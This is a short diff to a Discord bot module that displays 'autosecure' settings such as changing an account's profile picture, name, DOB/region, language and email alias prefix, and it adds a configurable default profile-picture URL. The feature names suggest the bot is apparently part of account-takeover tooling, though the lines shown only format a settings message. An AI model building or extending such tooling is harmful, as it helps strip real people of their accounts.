@@ -1,5 +1,6 @@
 const { queryParams } = require("../../../db/database");
 const { EmbedBuilder, StringSelectMenuBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
+const config = require("../../../config.json");
 
 module.exports = async function autosecureMsg(botnumber, ownerid) {
     let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=? AND botnumber=?`, [ownerid, botnumber]);
@@ -161,7 +162,7 @@ module.exports = async function autosecureMsg(botnumber, ownerid) {
             { name: "Change PFP", value: settings.changepfp ? "✅" : "❌", inline: true },
             { name: "Custom Name", value: settings.name ? settings.name.replace("|", " ") : "Generated", inline: true },
             { name: "Custom DOB/Region", value: settings.dob ? formatDobIso(settings.dob) : "Generated", inline: true },
-            { name: "Custom PFP", value: settings.pfp && settings.pfp !== "https://static.wikia.nocookie.net/leagueoflegends/images/e/e2/Warding_Totem_item.png/revision/latest/smart/width/250/height/250?cb=20201109132946" ? "Custom" : "Default", inline: true },
+            { name: "Custom PFP", value: settings.pfp && settings.pfp !== (config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png") && settings.pfp !== "https://static.wikia.nocookie.net/leagueoflegends/images/e/e2/Warding_Totem_item.png/revision/latest/smart/width/250/height/250?cb=20201109132946" ? "Custom" : "Default", inline: true },
             { name: "Change Language", value: settings.changelanguage ? "✅" : "❌", inline: true },
             { name: "Custom Language", value: settings.language ? `${settings.language}` : "Default: en-US", inline: true },
             { name: "Email/Alias Prefix", value: settings.prefix ? settings.prefix : "HachiiroMC", inline: true }
